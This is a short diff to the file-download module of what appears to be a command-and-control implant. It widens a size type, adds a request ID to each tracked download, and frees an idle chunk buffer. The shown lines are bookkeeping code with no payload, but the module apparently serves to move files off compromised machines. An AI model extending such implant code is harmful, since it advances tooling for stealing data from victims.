@@ -3,16 +3,17 @@
 #include <Core/MiniStd.h>
 
 /* Add file to linked list with type (upload/download) */
-PDOWNLOAD_DATA DownloadAdd( HANDLE hFile, DWORD MaxSize )
+PDOWNLOAD_DATA DownloadAdd( HANDLE hFile, LONGLONG MaxSize )
 {
     PDOWNLOAD_DATA Download = NULL;
 
-    Download           = NtHeapAlloc( sizeof( DOWNLOAD_DATA ) );
-    Download->FileID   = RandomNumber32();
-    Download->hFile    = hFile;
-    Download->Size     = MaxSize;
-    Download->State    = DOWNLOAD_STATE_RUNNING;
-    Download->Next     = Instance.Downloads;
+    Download            = NtHeapAlloc( sizeof( DOWNLOAD_DATA ) );
+    Download->FileID    = RandomNumber32();
+    Download->hFile     = hFile;
+    Download->Size      = MaxSize;
+    Download->State     = DOWNLOAD_STATE_RUNNING;
+    Download->Next      = Instance.Downloads;
+    Download->RequestID = Instance.CurrentRequestID;
 
     /* Push to linked list */
     Instance.Downloads = Download;
@@ -98,8 +99,19 @@ VOID DownloadPush()
 
     Download = Instance.Downloads;
 
-    /* TODO: Check if we have some downloads
-     *       If not then free the chunk memory. */
+    /* do we actually have downloads pending? */
+    if ( ! Download )
+    {
+        /* we don't have any downloads, free the DownloadChunk if we have one */
+        if ( Instance.DownloadChunk.Buffer )
+        {
+            MemSet( Instance.DownloadChunk.Buffer, 0, Instance.DownloadChunk.Length );
+            NtHeapFree( Instance.DownloadChunk.Buffer );
+            Instance.DownloadChunk.Buffer = NULL;
+        }
+
+        return;
+    }
 
     /* process current running downloads () */
     for ( ;; )
